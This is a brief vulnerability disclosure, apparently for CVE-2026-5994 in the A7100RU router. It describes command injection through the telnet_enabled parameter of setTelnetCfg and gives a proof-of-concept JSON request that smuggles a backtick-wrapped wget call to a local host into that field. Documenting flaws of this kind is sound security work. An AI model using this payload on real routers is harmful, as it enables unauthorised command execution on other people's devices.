# A7100RU Vulnerability（CVE-2026-5994）
...
In  sub_4238D0 function, it reads in a user-provided parameter `telnet_enabled` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `telnet_enabled` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setTelnetCfg","telnet_enabled":"`wget 192.168.6.1:7777/testpoc`"
